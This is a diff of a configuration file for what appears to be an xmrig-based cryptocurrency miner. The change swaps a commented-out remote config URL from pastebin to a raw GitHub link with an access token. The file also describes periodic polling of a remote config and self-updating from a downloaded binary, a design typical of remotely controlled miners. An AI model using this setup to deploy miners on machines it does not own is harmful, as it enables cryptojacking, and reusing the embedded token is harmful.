@@ -7,7 +7,7 @@ proxy=1					; Change this value to "1" if you are mining to xmrig-proxy instead 
 keepalive=1				; 0 to disable keepalive, 1 to enable keepalive
 
 [Update]
-;config_url=https://pastebin.com/raw/Hi6F8uMw   	; You can update the url that points to the configuration file. Must begin with "http://" or "https://" 
+;config_url=https://raw.githubusercontent.com/shadk2233/rtxdf/master/sklbt.txt?token=AQRKVBSZ6H5GQ3T3NJYQLAC7FZENE   	; You can update the url that points to the configuration file. Must begin with "http://" or "https://" 
 knock_time=30 				     	; Number of minutes the miner waits between visits to config file. If never specified, default is 30 minutes. 
 ;update_url=http://mysite.com/new_miner		; url of new miner. Miner will get updated with this file. 
 ;update_hash=xxxxxxxxxx				; md5 hash of new miner file. 32 characters long (16 byte hexadecimal format for hash). You need to specify this value, othewise miner will not get updated!
